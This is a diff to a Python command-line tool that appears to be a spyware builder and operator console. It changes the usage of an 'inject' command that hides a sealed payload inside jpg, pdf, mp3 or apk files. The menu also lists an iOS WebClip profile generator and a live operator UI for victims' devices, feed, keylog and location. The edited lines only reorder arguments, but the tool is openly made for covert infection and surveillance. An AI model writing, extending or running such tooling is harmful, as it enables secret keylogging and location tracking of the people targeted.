@@ -56,7 +56,7 @@ MENU: List[tuple] = [
         ("5", "make ios [url]", "WebClip profile + PWA link for iPhone"),
     ]),
     ("INJECT", [
-        ("6", "inject <spec> <file>", "hide a sealed payload in that file (jpg/pdf/mp3/…/apk)"),
+        ("6", "inject <file> [spec]", "hide a sealed payload in that file (jpg/pdf/mp3/…/apk), then verify"),
     ]),
     ("OPERATE", [
         ("7", "run", "live operator UI (devices, feed, keylog, location)"),
@@ -488,7 +488,7 @@ def interactive() -> None:
                 ui.run("0.0.0.0", 8443, key, _host_from_config() or "http://127.0.0.1:8443")
             elif verb == "inject":
                 if len(args) < 1:
-                    print(term.Warn + "  inject <spec> <file>" + term.RESET)
+                    print(term.Warn + "  inject <file> [spec]" + term.RESET)
                 else:
                     _inject(args[0], args[1] if len(args) > 1 else "")
             elif verb == "make":
